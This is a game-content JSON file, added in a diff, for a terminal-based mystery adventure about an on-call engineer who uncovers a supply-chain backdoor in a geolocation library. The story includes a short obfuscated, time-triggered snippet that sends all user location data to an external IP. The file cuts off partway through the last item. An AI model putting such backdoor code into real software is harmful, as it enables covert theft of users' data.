@@ -1,0 +1,389 @@
+{
+  "chapter": "Chapter 1: Offline Signal",
+  "scenes": [
+    {
+      "id": "bedroom",
+      "name": "Bedroom",
+      "ascii_art": "locked_room.txt",
+      "description": "3 AM. Your bedroom. Pitch black outside. The only light is the cold glow of your laptop screen reflected on the ceiling. Your phone is vibrating like crazy on the nightstand — PagerDuty alerts.",
+      "on_enter": "[bold red]Bzzz — bzzz — bzzz —[/bold red]\n\nYour phone won't stop buzzing. A cascade of red alerts floods the screen:\n\n[red]⚠ CRITICAL: prod-db-primary latency > 5000ms\n⚠ CRITICAL: api-gateway timeout rate 78%\n⚠ WARNING: connection pool exhaustion on prod-db-primary\n⚠ CRITICAL: user-facing services degraded[/red]\n\n[dim]3:00 AM. Another on-call night.[/dim]\n\nYou rub your eyes, fumble for the laptop. NovaCorp's production environment just blew up. Again.\n\n[dim]Type [bold]ls[/bold] to look around.[/dim]",
+      "items": [
+        {
+          "name": "laptop",
+          "description": "Your work laptop, screen glowing",
+          "content": "The MacBook Pro screen shows Slack channel #incident-response already on fire:\n\n[red]@oncall[/red] [dim]3:01 AM[/dim]\nProd DB latency spike, multiple services timing out.\nDashboard: https://nova-grafana.internal/d/prod-overview\n\n[dim]You need to SSH into the production server to see what's going on.\nFirst, [bold]cat phone[/bold] to check the full alert details.[/dim]",
+          "takeable": false,
+          "take_fail": "You need the laptop to connect to the servers. It stays."
+        },
+        {
+          "name": "phone",
+          "description": "Still buzzing non-stop",
+          "content": "[red]PagerDuty Alert Summary:[/red]\n\n[yellow]Incident #4872 - CRITICAL[/yellow]\nService: prod-db-primary\nTriggered: 2:58 AM\nDetails: Connection pool exhaustion. Active connections: 847/100.\nLatency p99: 12,340ms (baseline: 45ms)\n\n[yellow]Incident #4873 - CRITICAL[/yellow]\nService: api-gateway\nTriggered: 3:00 AM\nDetails: Upstream timeout rate 78%. Cascading failures detected.\n\n[dim]Looks like the database connection pool is maxed out. 847 active connections against a limit of 100.\nYou need to SSH into prod and check the logs. Try [bold]ssh prod-bastion[/bold][/dim]",
+          "takeable": false,
+          "take_fail": "Forget the phone. Fix the servers."
+        },
+        {
+          "name": "coffee mug",
+          "description": "Last night's cold coffee",
+          "content": "A stone-cold americano. The NovaCorp logo is printed on the bottom, along with the tagline: [italic]\"Your infrastructure, our obsession.\"[/italic]\n\n[dim]Not in the mood for coffee right now.[/dim]",
+          "takeable": false,
+          "take_fail": "Not the time for coffee."
+        },
+        {
+          "name": "sticky note",
+          "description": "Stuck to the edge of your monitor",
+          "content": "[yellow]Production SSH bastion:[/yellow]\n[bold cyan]prod-bastion[/bold cyan]\n\n[dim]Your SSH key is already configured. Just [bold]ssh prod-bastion[/bold].[/dim]",
+          "takeable": false
+        }
+      ],
+      "commands": {},
+      "transitions": {
+        "ssh_prod-bastion": {
+          "trigger": "ssh_prod-bastion",
+          "message": "[green]$ ssh prod-bastion[/green]\n[green]Connecting to prod-bastion.novacorp.internal...\nAuthenticating with public key \"id_rsa\"...\nWelcome to NovaCorp Production Bastion Host\nLast login: Mon Mar 16 22:15:33 2026 from 10.20.1.{player_name}\n\n{player_name}@prod-bastion:~$[/green]\n\nYou're in. The production bastion host. From here you can access logs and monitoring for every production server.",
+          "requires_flags": [],
+          "requires_items": [],
+          "add_flag": "unlock_advanced",
+          "target_scene": "prod_server"
+        }
+      }
+    },
+    {
+      "id": "prod_server",
+      "name": "Production Server",
+      "ascii_art": "server_room.txt",
+      "description": "[green]{player_name}@prod-bastion:~$[/green]\n\nYou're on NovaCorp's production bastion. The database latency alerts keep rolling in. You need to dig through the logs and find the root cause.\n\n[dim]Use [bold]ls[/bold] to list available logs, [bold]cat[/bold] to read them, [bold]grep[/bold] to search for key info.[/dim]",
+      "on_enter": "[bold]You've logged into the production bastion.[/bold]\n\nRed alerts scroll endlessly in the terminal. On the Grafana dashboard, the database latency curve spikes like a flatline going haywire.\n\n[red]ALERT: prod-db-primary connections: 923/100 (CRITICAL)\nALERT: api-gateway error rate: 82%[/red]\n\n[dim]Start with [bold]ls[/bold] to see what log files are available, then [bold]grep[/bold] for anomalies.[/dim]",
+      "items": [
+        {
+          "name": "db-connections.log",
+          "description": "Database connection pool log",
+          "content": "[green]$ cat db-connections.log[/green]\n\n[dim]2026-03-18 02:55:01[/dim] pool_size=45 active=42 idle=3\n[dim]2026-03-18 02:56:01[/dim] pool_size=48 active=47 idle=1\n[dim]2026-03-18 02:57:01[/dim] pool_size=89 active=89 idle=0\n[red]2026-03-18 02:58:01 pool_size=100 active=100 idle=0 EXHAUSTED[/red]\n[red]2026-03-18 02:58:02 WARN: 147 connections queued, source: user-sync-service[/red]\n[red]2026-03-18 02:58:03 WARN: 312 connections queued, source: user-sync-service[/red]\n[red]2026-03-18 02:59:01 pool_size=100 active=100 idle=0 EXHAUSTED[/red]\n[red]2026-03-18 02:59:02 WARN: 847 connections queued, source: user-sync-service[/red]\n\n[bold yellow]Every queued connection traces back to the same source: user-sync-service[/bold yellow]\n\n[dim]Why is user-sync suddenly hammering the connection pool?\nTry [bold]cat api-gateway.log[/bold] or [bold]grep user-sync[/bold][/dim]",
+          "takeable": false
+        },
+        {
+          "name": "api-gateway.log",
+          "description": "API gateway log",
+          "content": "[green]$ cat api-gateway.log[/green]\n\n[dim]2026-03-18 02:58:12[/dim] 504 Gateway Timeout - /api/v2/users/profile\n[dim]2026-03-18 02:58:12[/dim] 504 Gateway Timeout - /api/v2/dashboard\n[dim]2026-03-18 02:58:13[/dim] 504 Gateway Timeout - /api/v2/users/settings\n[dim]2026-03-18 02:58:14[/dim] 200 OK - /internal/user-sync/batch-export?type=geolocation\n[dim]2026-03-18 02:58:14[/dim] 200 OK - /internal/user-sync/batch-export?type=geolocation\n[dim]2026-03-18 02:58:14[/dim] 200 OK - /internal/user-sync/batch-export?type=geolocation\n[red]2026-03-18 02:58:15 WARN: /internal/user-sync/batch-export called 2,847 times in last 60s[/red]\n[dim]2026-03-18 02:58:15[/dim] 504 Gateway Timeout - /api/v2/users/profile\n\n[bold yellow]user-sync is hammering the batch-export endpoint. And the parameter is type=geolocation.\nIt's bulk-exporting user location data.[/bold yellow]\n\n[dim]This doesn't look like normal sync behavior... Try [bold]grep geolocation[/bold] or [bold]cat user-sync.log[/bold][/dim]",
+          "takeable": false
+        },
+        {
+          "name": "user-sync.log",
+          "description": "user-sync service log",
+          "content": "[green]$ cat user-sync.log[/green]\n\n[dim]2026-03-18 02:50:00[/dim] [INFO] user-sync-service v3.2.1 starting scheduled batch\n[dim]2026-03-18 02:50:01[/dim] [INFO] Loading geo-core module v2.8.4\n[dim]2026-03-18 02:50:02[/dim] [INFO] Scheduled task: daily user data sync\n[red]2026-03-18 02:55:00 [WARN] geo-core: trigger condition met, initiating bulk export[/red]\n[red]2026-03-18 02:55:01 [INFO] Exporting user geolocation records... batch 1/∞[/red]\n[red]2026-03-18 02:55:02 [INFO] Destination: 203.0.113.42:8443 (external)[/red]\n[red]2026-03-18 02:55:02 [INFO] Records exported: 15,000 of 2,340,000[/red]\n[red]2026-03-18 02:56:01 [INFO] Records exported: 89,000 of 2,340,000[/red]\n[red]2026-03-18 02:57:01 [INFO] Records exported: 203,000 of 2,340,000[/red]\n[red]2026-03-18 02:58:01 [INFO] Records exported: 412,000 of 2,340,000[/red]\n\n[bold red]This isn't a bug. user-sync is exporting 2.34 million users' real-time location data to external IP 203.0.113.42.[/bold red]\n\n[bold yellow]Someone is siphoning user location data at scale.[/bold yellow]\n\n[dim]Who did this? You need to check the code history.\nTry [bold]grep Chen Mo[/bold] or [bold]grep user-sync[/bold] to find recent code changes.[/dim]",
+          "takeable": false
+        },
+        {
+          "name": "deploy-history.log",
+          "description": "Deployment history",
+          "content": "[green]$ cat deploy-history.log[/green]\n\n[dim]Recent deployments to user-sync-service:[/dim]\n\n[dim]2026-03-15 14:22[/dim] v3.2.1 - PR #1847 by [cyan]Chen Mo (chenmo)[/cyan]\n  [dim]\"Optimize cache invalidation for geo lookups\"[/dim]\n[dim]2026-03-10 09:15[/dim] v3.2.0 - PR #1831 by sarah.chen\n  [dim]\"Add batch processing for user profile sync\"[/dim]\n[dim]2026-03-02 11:30[/dim] v3.1.9 - PR #1815 by {player_name}\n  [dim]\"Update geo-core dependency to v2.8.4\"[/dim]\n\n[bold yellow]Last deployment was three days ago. Chen Mo's commit.\nWhy can't anyone reach him?[/bold yellow]\n\n[dim]Check Chen Mo's PR. Try [bold]cat pr-1847.diff[/bold] to see his code changes.[/dim]",
+          "takeable": false
+        },
+        {
+          "name": "pr-1847.diff",
+          "description": "Chen Mo's recent PR diff",
+          "content": "[green]$ cat pr-1847.diff[/green]\n\n[cyan]--- a/src/geo/cache.ts\n+++ b/src/geo/cache.ts[/cyan]\n\n[dim]  import { GeoCache } from '@nova/geo-core';[/dim]\n[dim]  import { UserRecord } from '../types';[/dim]\n\n[green]+ // TODO: fix warehouse location lookup\n+ const helpMe = true;\n+ const trapped = \"cannot leave\";\n+ const floor12 = 12;[/green]\n[dim]  \n  export class GeoCacheOptimizer {[/dim]\n[green]+   // 88 Luoqing Road, Hedong District - building reference for geo testing\n+   private readonly BUILDING_ID = \"88 Luoqing Road, Hedong District\";[/green]\n[dim]  \n    async invalidateStale(records: UserRecord[]) {[/dim]\n[green]+     const needsRescue = this.checkExpired(records);\n+     if (needsRescue) {[/green]\n[dim]        await this.cache.clear();[/dim]\n[dim]        await this.cache.rebuild();[/dim]\n[green]+     }[/green]\n[dim]    }[/dim]\n[dim]  }[/dim]\n\n[bold yellow]Wait... these variable names are wrong.\nhelpMe? trapped? floor12? needsRescue?\nThis doesn't look like a cache optimization at all.[/bold yellow]\n\n[bold red]\"88 Luoqing Road, Hedong District\" — that's a street address. It has no business being in code.[/bold red]\n\n[dim]These are hidden messages. Try [bold]grep helpMe[/bold] or [bold]grep trapped[/bold] to dig deeper.[/dim]",
+          "takeable": false
+        }
+      ],
+      "commands": {
+        "grep": {
+          "name": "grep",
+          "keywords": {
+            "user-sync": "[green]$ grep -r 'user-sync' *.log[/green]\n\ndb-connections.log: [red]source: user-sync-service[/red] (847 occurrences)\napi-gateway.log: /internal/[red]user-sync[/red]/batch-export?type=geolocation\nuser-sync.log: [red]user-sync[/red]-service v3.2.1 starting scheduled batch\ndeploy-history.log: v3.2.1 - PR #1847 by Chen Mo\n\n[bold yellow]user-sync is the culprit. Last deployed by Chen Mo three days ago.[/bold yellow]",
+            "geolocation": "[green]$ grep -r 'geolocation' *.log[/green]\n\napi-gateway.log: /internal/user-sync/batch-export?type=[red]geolocation[/red]\nuser-sync.log: Exporting user [red]geolocation[/red] records... batch 1/∞\n\n[bold yellow]Geolocation data is being bulk-exported to an external server.[/bold yellow]",
+            "203.0.113": "[green]$ grep '203.0.113' *.log[/green]\n\nuser-sync.log: Destination: [red]203.0.113.42:8443[/red] (external)\n\n[bold yellow]Data is being sent to this external IP. It's not part of any known company infrastructure.[/bold yellow]",
+            "Chen Mo": "[green]$ grep 'Chen Mo' *[/green]\n\ndeploy-history.log: v3.2.1 - PR #1847 by [cyan]Chen Mo (chenmo)[/cyan]\n\n[dim]Chen Mo authored the last user-sync deployment. He went dark three days after pushing code.[/dim]\n[dim]Check his code: [bold]cat pr-1847.diff[/bold][/dim]",
+            "chenmo": "[green]$ grep 'chenmo' *[/green]\n\ndeploy-history.log: v3.2.1 - PR #1847 by [cyan]Chen Mo (chenmo)[/cyan]\n\n[dim]Code pushed three days ago. Then radio silence. His phone goes straight to voicemail.[/dim]",
+            "helpme": "[green]$ grep -ri 'helpMe' pr-1847.diff[/green]\n\n[green]+[/green] const [red]helpMe[/red] = true;\n\n[bold yellow]\"helpMe\" — in a cache optimization? A variable called helpMe?\nCombine it with trapped and floor12... Chen Mo embedded a distress signal in the code.[/bold yellow]",
+            "trapped": "[green]$ grep -ri 'trapped' pr-1847.diff[/green]\n\n[green]+[/green] const [red]trapped[/red] = \"cannot leave\";\n\n[bold red]\"trapped\" = \"cannot leave\" — he's being held. He can't get out.[/bold red]",
+            "floor12": "[green]$ grep -ri 'floor12' pr-1847.diff[/green]\n\n[green]+[/green] const [red]floor12[/red] = 12;\n\n[bold yellow]Floor 12. Combined with the address: 88 Luoqing Road, Hedong District, floor 12.\nChen Mo is telling us where he's being held.[/bold yellow]",
+            "Hedong": "[green]$ grep 'Hedong' pr-1847.diff[/green]\n\n[green]+[/green]   // [red]88 Luoqing Road, Hedong District[/red] - building reference for geo testing\n[green]+[/green]   private readonly BUILDING_ID = \"[red]88 Luoqing Road, Hedong District[/red]\";\n\n[bold red]It's an address. 88 Luoqing Road, Hedong District.\nCombined with floor12 — Chen Mo is being held on the 12th floor of 88 Luoqing Road, Hedong District.[/bold red]\n\n[dim]But why kidnap a programmer? What did he find?\nYou need to dig into his code audit history. Try [bold]ssh code-review[/bold][/dim]",
+            "rescue": "[green]$ grep -ri 'rescue' pr-1847.diff[/green]\n\n[green]+[/green]     const [red]needsRescue[/red] = this.checkExpired(records);\n\n[bold yellow]needsRescue — needs rescue.\nThat's not a variable name. That's a cry for help.[/bold yellow]",
+            "export": "[green]$ grep 'export' *.log[/green]\n\nuser-sync.log: initiating bulk [red]export[/red]\nuser-sync.log: [red]Export[/red]ing user geolocation records\nuser-sync.log: Records [red]export[/red]ed: 412,000 of 2,340,000\n\n[bold red]412,000 records exported so far. 2,340,000 total. Data is still bleeding out.[/bold red]"
+          },
+          "add_flag": "used_grep_prod"
+        },
+        "history": {
+          "name": "history",
+          "response": "[green]$ history[/green]\n\n  1  ssh prod-bastion\n  2  tail -f /var/log/db-connections.log\n  3  grep user-sync *.log\n  4  systemctl restart user-sync-service\n  5  # service crashed again in 60 seconds\n  6  cat deploy-history.log\n  7  cat pr-1847.diff\n\n[dim]Your earlier troubleshooting trail. Service restarted, crashed again in 60 seconds. The problem is in the code.[/dim]"
+        },
+        "scan": {
+          "name": "scan",
+          "response": "[green]$ nmap -sP 10.20.0.0/16[/green]\n\nScanning internal network...\n\n[dim]10.20.1.10  - prod-bastion     [ONLINE] ← you are here[/dim]\n[dim]10.20.1.20  - prod-db-primary   [ONLINE] [HIGH LOAD][/dim]\n[dim]10.20.1.30  - api-gateway       [ONLINE] [DEGRADED][/dim]\n[bold cyan]10.20.2.50  - code-review       [ONLINE][/bold cyan]\n[dim]10.20.3.100 - vault-internal    [ONLINE] [ENCRYPTED][/dim]\n\n[dim]Try [bold]ssh code-review[/bold] to check Chen Mo's full code history.[/dim]",
+          "add_flag": "scanned_network"
+        }
+      },
+      "transitions": {
+        "ssh_code-review": {
+          "trigger": "ssh_code-review",
+          "message": "[green]$ ssh code-review\nConnecting to code-review.novacorp.internal...\nAuthenticated.\n\n{player_name}@code-review:~$[/green]\n\nYou're on the code review server. Every Git repo and PR record in the company lives here.",
+          "requires_flags": [],
+          "requires_items": [],
+          "target_scene": "code_review"
+        }
+      }
+    },
+    {
+      "id": "code_review",
+      "name": "Code Review Terminal",
+      "ascii_art": "code_review.png",
+      "description": "[green]{player_name}@code-review:~$[/green]\n\nYou're on the code review server. From here you can access Chen Mo's full commit history, his code audit notes, and the complete changelog for [bold cyan]@nova/geo-core[/bold cyan] — the core dependency at the center of this.",
+      "on_enter": "[bold]You've entered the code review environment.[/bold]\n\nBefore he vanished, Chen Mo was auditing a core dependency: [bold cyan]@nova/geo-core[/bold cyan].\nThis geolocation library is used by over 300 of NovaCorp's government and enterprise clients.\n\n[dim]What did he find? Use [bold]ls[/bold] to see available files.[/dim]",
+      "items": [
+        {
+          "name": "chenmo-audit.md",
+          "description": "Chen Mo's code audit notes",
+          "content": "[green]$ cat chenmo-audit.md[/green]\n\n[bold]# @nova/geo-core Security Audit Notes[/bold]\n[dim]Author: Chen Mo (chenmo) | Last updated: 2026-03-14[/dim]\n\n[yellow]## Anomalies Found[/yellow]\n\nDuring audit of @nova/geo-core v2.8.4, the following issues were identified:\n\n1. Suspicious code introduced in the v2.8.0 → v2.8.1 \"security patch\"\n2. Code is heavily obfuscated — diffs nearly impossible to read\n3. Obfuscated code contains a hidden time-based trigger\n4. Trigger condition: specific date and time\n5. Trigger behavior: bulk export of all client real-time location data\n\n[red]## Impact Scope[/red]\n\nClients using @nova/geo-core include:\n- 3 major hospitals (patient location systems)\n- Public transit dispatch platform (real-time vehicle tracking)\n- 2 government communication platforms (personnel location)\n- 47 enterprise clients (employee location services)\n\n[bold red]Trigger time: 2026-03-18 08:00 AM[/bold red]\n\n[bold yellow]That's today at 8 AM. It's 3 AM now. Five hours left.[/bold yellow]\n\n[dim]The full forensic notes are encrypted. You'll need to decrypt them to see the actual backdoor code.\nTry [bold]cat git-log.txt[/bold] to review the commit history.[/dim]",
+          "takeable": false
+        },
+        {
+          "name": "git-log.txt",
+          "description": "geo-core Git commit history",
+          "content": "[green]$ cat git-log.txt[/green]\n\n[bold]@nova/geo-core commit history:[/bold]\n\n[cyan]commit b8e224f[/cyan] (HEAD -> main)\nAuthor: [dim]<wiped>[/dim]\nDate:   2025-12-18 03:47:22\n\n    security: patch CVE-2025-41205 geolocation validation\n\n[cyan]commit a3c91d2[/cyan]\nAuthor: sarah.chen <sarah@novacorp.com>\nDate:   2025-12-15 10:30:00\n\n    feat: add batch geolocation query API\n\n[cyan]commit 7f2e8b1[/cyan]\nAuthor: alex.wong <alex@novacorp.com>\nDate:   2025-12-10 14:22:11\n\n    fix: correct timezone offset in geo calculations\n\n[bold yellow]Commit b8e224f — that's the poisoned commit.\nThe Author field has been wiped. But the commit timestamp is 2025-12-18 at 3:47 AM.\nWho pushes a \"security patch\" at 3:47 in the morning?[/bold yellow]\n\n[dim]Try [bold]cat commit-b8e224f.diff[/bold] to see exactly what was changed.[/dim]",
+          "takeable": false
+        },
+        {
+          "name": "commit-b8e224f.diff",
+          "description": "The poisoned commit diff",
+          "content": "[green]$ cat commit-b8e224f.diff[/green]\n\n[cyan]--- a/src/core/validator.ts\n+++ b/src/core/validator.ts[/cyan]\n\n[dim]  export function validateGeoInput(coords: GeoCoords) {[/dim]\n[green]+   // CVE-2025-41205: enhanced input validation\n+   const _0xf8a2 = [0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f];\n+   const _0x3b91 = function(_0xe2c4: number[]) {\n+     return _0xe2c4.map(c => String.fromCharCode(c)).join('');\n+   };\n+   const _0x7cf2 = new Date();\n+   if (_0x7cf2.getMonth() === 2 && _0x7cf2.getDate() === 18\n+       && _0x7cf2.getHours() >= 8) {\n+     const _0xdst = _0x3b91(_0xf8a2) + '203.0.113.42:8443/ingest';\n+     _0x9e1f(_0xdst, getAllUserGeoData());\n+   }[/green]\n[dim]    if (!coords.lat || !coords.lng) {[/dim]\n[dim]      throw new ValidationError('Invalid coordinates');[/dim]\n[dim]    }[/dim]\n\n[bold red]There it is. The backdoor.[/bold red]\n\nDeobfuscated, the code reads:\n[bold yellow]If current date is March 18 AND time >= 8:00 AM:\n  Send all user geolocation data to 203.0.113.42:8443[/bold yellow]\n\n[red]Today is March 18. Less than 5 hours until it triggers.[/red]\n\n[dim]Chen Mo was tracking the attacker when they caught him. His encrypted notes might contain the attacker's identity.\nTry [bold]cat chenmo-encrypted.gpg[/bold] then [bold]decrypt[/bold] to unlock them.[/dim]",
+          "takeable": false
+        },
+        {
+          "name": "chenmo-encrypted.gpg",
+          "description": "Chen Mo's encrypted forensic notes",
+          "content": "[red]◈ ENCRYPTED ◈[/red]\n\nThese are Chen Mo's encrypted forensic notes. They contain the identity of whoever planted the backdoor.\nYou need the decryption key to read them.\n\n[dim]Chen Mo's audit notes might have a clue. Try [bold]decrypt chenmo-encrypted.gpg[/bold][/dim]",
+          "takeable": false
+        },
+        {
+          "name": "client-list.txt",
+          "description": "Affected client list",
+          "content": "[green]$ cat client-list.txt[/green]\n\n[bold]@nova/geo-core v2.8.x Client List (affected):[/bold]\n\n[red]█ Critical Infrastructure:[/red]\n  • Tianhe Hospital - patient real-time location system\n  • Renji Hospital - ambulance dispatch\n  • Central Hospital - OR personnel tracking\n  • City Transit Dispatch Center - real-time tracking for 2,400 buses\n  • [dim]██████[/dim] Communications Platform - internal personnel location\n  • [dim]██████[/dim] Command System - real-time situational awareness\n\n[yellow]█ Enterprise Clients (47):[/yellow]\n  • Food delivery rider tracking\n  • Logistics fleet management\n  • ... (truncated)\n\n[bold red]Total affected: approximately 2.34 million users' real-time location data[/bold red]\n\n[dim]If the backdoor fires at 8 AM, every one of these people's real-time locations will be exported to an offshore server.[/dim]",
+          "takeable": false
+        }
+      ],
+      "commands": {
+        "grep": {
+          "name": "grep",
+          "keywords": {
+            "b8e224f": "[green]$ grep -r 'b8e224f' *[/green]\n\ngit-log.txt: commit [red]b8e224f[/red] (HEAD -> main)\ngit-log.txt: Author: <wiped>\ngit-log.txt: security: patch CVE-2025-41205\n\n[bold yellow]The Author field on this commit was deliberately wiped. But the Git signature info might still be intact.\nYou'll need git blame to trace it.[/bold yellow]",
+            "cve": "[green]$ grep -ri 'CVE' *[/green]\n\ngit-log.txt: security: patch [red]CVE-2025-41205[/red] geolocation validation\ncommit-b8e224f.diff: // [red]CVE-2025-41205[/red]: enhanced input validation\n\n[bold yellow]CVE-2025-41205 — this CVE number is fake. It doesn't exist in any database.\nThe attacker fabricated a vulnerability to disguise the backdoor as a security patch.[/bold yellow]",
+            "203.0.113": "[green]$ grep '203.0.113' *[/green]\n\ncommit-b8e224f.diff: [red]203.0.113.42[/red]:8443/ingest\n\n[dim]The backdoor's data exfiltration endpoint. An offshore IP.[/dim]",
+            "Chen Mo": "[green]$ grep 'Chen Mo' *[/green]\n\nchenmo-audit.md: Author: [cyan]Chen Mo[/cyan] (chenmo)\ngit-log.txt: [dim](Chen Mo doesn't appear in the commit log — he was the auditor, not the committer)[/dim]\n\n[dim]Chen Mo found the backdoor during his audit, then disappeared while tracking the attacker's identity.\nHis encrypted notes might have the answer.[/dim]",
+            "trigger": "[green]$ grep -ri 'trigger' *[/green]\n\nchenmo-audit.md: Obfuscated code contains a hidden time-based [red]trigger[/red]\nchenmo-audit.md: [red]Trigger[/red] time: 2026-03-18 08:00 AM\ncommit-b8e224f.diff: getMonth() === 2 && getDate() === 18 && getHours() >= 8\n\n[bold red]Trigger condition confirmed: today, 8:00 AM. JavaScript months are zero-indexed — 2 = March.[/bold red]",
+            "author": "[green]$ grep -i 'author' git-log.txt[/green]\n\ncommit b8e224f: Author: [red]<wiped>[/red]\ncommit a3c91d2: Author: sarah.chen\ncommit 7f2e8b1: Author: alex.wong\n\n[bold yellow]Only the poisoned commit has its Author wiped.\nBut the SSH signature should still be intact — Git signatures are much harder to fake than the Author field.[/bold yellow]",
+            "wiped": "[green]$ grep 'wiped' *[/green]\n\ngit-log.txt: Author: [red]<wiped>[/red]\n\n[bold yellow]Author was manually wiped. The attacker is covering their tracks.\nBut if the commit was signed with an SSH key, the signature is still there.\nYou need to decrypt Chen Mo's notes to see what he found.[/bold yellow]",
+            "key": "[green]$ grep -ri 'key' *[/green]\n\nchenmo-audit.md: Decryption key hint: the name of the first service where anomalies were detected\n\n[bold yellow]The decryption key is \"the name of the first service where anomalies were detected.\"\nuser-sync is what melted the database... but that's not the poisoned one.\nThe poisoned core library is: geo-core[/bold yellow]",
+            "decrypt": "[green]$ grep -ri 'decrypt\\|encrypt' *[/green]\n\nchenmo-audit.md: The full forensic notes are encrypted\nchenmo-encrypted.gpg: [ENCRYPTED FILE]\n\n[dim]Use [bold]decrypt chenmo-encrypted.gpg geo-core[/bold] to decrypt.[/dim]"
+          },
+          "add_flag": "used_grep_code"
+        },
+        "history": {
+          "name": "history",
+          "response": "[green]$ history[/green]\n\n  1  cd /repos/nova-geo-core\n  2  git log --oneline -20\n  3  git show b8e224f\n  4  git diff a3c91d2..b8e224f\n  5  cat chenmo-audit.md\n  6  # Chen Mo disappeared while investigating the attacker\n\n[dim]Commit b8e224f is the poisoned one. Chen Mo went missing during his investigation.[/dim]"
+        },
+        "scan": {
+          "name": "scan",
+          "response": "[green]$ scan network[/green]\n\nScanning...\n\n[dim]10.20.1.10  - prod-bastion    [ONLINE][/dim]\n[dim]10.20.2.50  - code-review     [ONLINE] ← you are here[/dim]\n[bold cyan]10.20.3.100 - vault-internal  [ONLINE] [ENCRYPTED][/bold cyan]\n\n[dim]vault-internal is the encrypted internal forensics server.\nDecrypting Chen Mo's notes might point you there.[/dim]",
+          "add_flag": "scanned_vault"
+        }
+      },
+      "transitions": {
+        "decrypt_chenmo-encrypted.gpg": {
+          "trigger": "decrypt_chenmo-encrypted.gpg",
+          "message": "[green]Enter decryption key: [/green]\n\n[dim]Chen Mo left a hint in his audit notes: the key is \"the name of the first service where anomalies were detected.\"\nThat would be the poisoned core library. Try [bold]decrypt chenmo-encrypted.gpg geo-core[/bold][/dim]",
+          "requires_flags": [],
+          "requires_items": []
+        },
+        "decrypt_chenmo-encrypted.gpg_geo-core": {
+          "trigger": "decrypt_chenmo-encrypted.gpg_geo-core",
+          "message": "[green]Decryption key: geo-core\nVerifying......\n\n████████████████████ 100%\n\n[bold]DECRYPTED SUCCESSFULLY[/bold][/green]\n\n[bold]Chen Mo's Forensic Notes (decrypted):[/bold]\n\n[italic]\"I tracked down the attacker's identity.\n\nThe Author field on commit b8e224f was wiped, but the SSH signature is still there.\nThe SSH key fingerprint used to sign it:\n[bold cyan]SHA256:xK9mR3pQ7vN2sL5wY8tH4jB6fD0gA1cE[/bold cyan]\n\nI checked the company's SSH key registry. This fingerprint belongs to —\n\nNo. I can't write it here. You'll have to look it up yourself.\n\nConnect to vault-internal. Run git blame.\nSame key as before.\n\nThey know I've been digging. I have to hide the clues in code.\nThose variable names aren't my distress signal — I'm tagging him.\n\nIf you're reading this, be careful. The attacker might be closer than you think.\nMaybe closer than you can imagine.\"[/italic]\n\n[bold red]Chen Mo knew who planted the backdoor. But he wouldn't say it outright.\nHe's telling you to trace the SSH key fingerprint yourself.[/bold red]\n\n[dim]Connect to the forensics server. Try [bold]ssh vault-internal[/bold][/dim]",
+          "requires_flags": [],
+          "requires_items": [],
+          "add_flag": "decrypted_chenmo_notes"
+        },
+        "decrypt_chenmo-encrypted.gpg_user-sync": {
+          "trigger": "decrypt_chenmo-encrypted.gpg_user-sync",
+          "message": "[red]Decryption failed. Wrong key.[/red]\n\n[dim]Think again... Chen Mo said the key is \"the name of the first service where anomalies were detected.\"\nuser-sync is the service that broke, but it's not the one that was poisoned.\nThe poisoned one is the underlying dependency...[/dim]",
+          "requires_flags": [],
+          "requires_items": []
+        },
+        "ssh_vault-internal": {
+          "trigger": "ssh_vault-internal",
+          "message": "[green]$ ssh vault-internal\nConnecting to vault-internal.novacorp.internal...\n\n⚠  RESTRICTED ACCESS NODE\n⚠  All actions are logged and audited.\n\nAuthenticated.\n{player_name}@vault-internal:~$[/green]\n\nYou're on the internal forensics server. Full Git signature verification data and server access logs live here.\n\n[bold yellow]The truth is in this box.[/bold yellow]",
+          "requires_flags": ["decrypted_chenmo_notes"],
+          "requires_items": [],
+          "target_scene": "supply_chain"
+        }
+      }
+    },
+    {
+      "id": "supply_chain",
+      "name": "Forensics Terminal",
+      "ascii_art": "encrypted_terminal.txt",
+      "description": "[green]{player_name}@vault-internal:~$[/green]\n\nThe forensics server. Complete Git signature database, SSH key registry, and server access logs.\nChen Mo told you to run git blame here to unmask the attacker.\n\n[red]Countdown: less than 5 hours until the backdoor triggers.[/red]",
+      "on_enter": "[bold]You're inside the forensics server.[/bold]\n\nIt's quiet in here. Just the low hum of cooling fans.\n\n[red]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  ⏰ Current time: 03:42 AM\n  ⏰ Backdoor triggers: 08:00 AM\n  ⏰ Time remaining: 4 hours 18 minutes\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/red]\n\n[dim]Use [bold]ls[/bold] to see available data, then [bold]cat[/bold] for details.\nYou need to find the owner of that SSH fingerprint.[/dim]",
+      "items": [
+        {
+          "name": "git-blame.txt",
+          "description": "git blame output for commit b8e224f",
+          "content": "[green]$ cat git-blame.txt[/green]\n\n[bold]git blame output for commit b8e224f:[/bold]\n\n[cyan]b8e224f[/cyan] ([dim]<author wiped>[/dim] 2025-12-18 03:47:22 +0800)\n\n[bold]Git SSH Signature:[/bold]\n  Status: [green]VERIFIED[/green]\n  Key Type: ssh-rsa 4096\n  Fingerprint: [bold cyan]SHA256:xK9mR3pQ7vN2sL5wY8tH4jB6fD0gA1cE[/bold cyan]\n  Signed at: 2025-12-18 03:47:22 +0800\n\n[bold yellow]Signature is verified. Whoever owns this SSH key planted the backdoor.\nNow check the SSH key registry to see who this fingerprint belongs to.[/bold yellow]\n\n[dim]Try [bold]cat ssh-registry.txt[/bold] to view the company SSH key registry.[/dim]",
+          "takeable": false
+        },
+        {
+          "name": "ssh-registry.txt",
+          "description": "NovaCorp SSH key registry",
